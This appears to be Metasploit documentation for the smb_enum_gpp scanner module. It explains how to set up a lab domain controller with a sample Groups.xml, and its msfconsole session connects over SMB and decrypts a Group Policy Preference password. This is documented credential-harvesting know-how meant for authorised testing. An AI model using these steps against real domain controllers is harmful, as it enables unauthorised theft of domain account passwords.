## Vulnerable Application

This module enumerates files from target domain controllers and connects to them via SMB. It then looks for Group Policy
Preference XML files containing local/domain user accounts and passwords and decrypts them using Microsoft's public AES
key. This module has been tested successfully on a Win2k8 R2 Domain Controller.

### Test Environment

This vulnerability was patched in 2014 but Group Policy Preference files can still be found in modern environments. Because of that it is
necessary to have a means to test this vulnerability in a contrived way.

Starting from a Windows Server that has been configured as an Active Directory Domain Controller:
1. Navigate to: `%SystemRoot%\SYSVOL\sysvol\$domain\Policies` where `$domain` is the name of the domain.
1. Create a subfolder. These folders typically use UUIDs within braces (e.g. `{31B2F340-016D-11D2-945F-00C04FB984F9}`) but the name does not
   matter for testing purposes.
1. In the new a new file (and the necessary parent folders) `MACHINE\Preferences\Groups\Groups.xml`.
1. Place the contents below in the new `Groups.xml` file.

```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
	<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="SuperSecretBackdoor" image="0" changed="2013-04-25 18:36:07" uid="{B5EDB865-34F5-4BD7-9C59-3AEB1C7A68C3}">
		<Properties action="C" fullName="" description="" cpassword="VBQUNbDhuVti3/GHTGHPvcno2vH3y8e8m1qALVO1H3T0rdkr2rub1smfTtqRBRI3" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="SuperSecretBackdoor"/>
	</User>
</Groups>
```

This example XML data was taken from the unit test.

## Verification Steps
Example steps in this format (is also in the PR):

1. Start msfconsole
1. Do: `use auxiliary/scanner/smb/smb_enum_gpp`
1. Do: `set RHOSTS ...`
1. Do: `set SMBUser ...`
1. Do: `set SMBPass ...`
1. Do: `run`

### Windows Server 2019 (Test Setup)

The following example use the contrived setup from the "Test Environment" section.

```
msf6 auxiliary(scanner/smb/smb_enum_gpp) > use auxiliary/scanner/smb/smb_enum_gpp 
msf6 auxiliary(scanner/smb/smb_enum_gpp) > set RHOSTS 192.168.159.10
RHOSTS => 192.168.159.10
msf6 auxiliary(scanner/smb/smb_enum_gpp) > set SMBUSER smcintyre
SMBUSER => smcintyre
msf6 auxiliary(scanner/smb/smb_enum_gpp) > set SMBPass Password1
SMBPass => Password1
msf6 auxiliary(scanner/smb/smb_enum_gpp) > run

[*] 192.168.159.10:445    - Connecting to the server...
[*] 192.168.159.10:445    - Mounting the remote share \\192.168.159.10\SYSVOL'...
[+] 192.168.159.10:445    - Found Policy Share on 192.168.159.10
[*] 192.168.159.10:445    - Parsing file: \\192.168.159.10\SYSVOL\msflab.local\Policies\fake\MACHINE\Preferences\Groups\Groups.xml
[+] 192.168.159.10:445    - Group Policy Credential Info
============================

 Name               Value
 ----               -----
 TYPE               Groups.xml
 USERNAME           SuperSecretBackdoor
 PASSWORD           Super!!!Password
 DOMAIN CONTROLLER  192.168.159.10
 DOMAIN             msflab.local
 CHANGED            2013-04-25 18:36:07
 NEVER_EXPIRES?     1
 DISABLED           0

[+] 192.168.159.10:445    - XML file saved to: /home/smcintyre/.msf4/loot/20200828163158_default_192.168.159.10_microsoft.window_053830.txt
[+] 192.168.159.10:445    - Groups.xml saved as: /home/smcintyre/.msf4/loot/20200828163158_default_192.168.159.10_smb.shares.file_279441.xml
[*] 192.168.159.10:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_enum_gpp) >
```
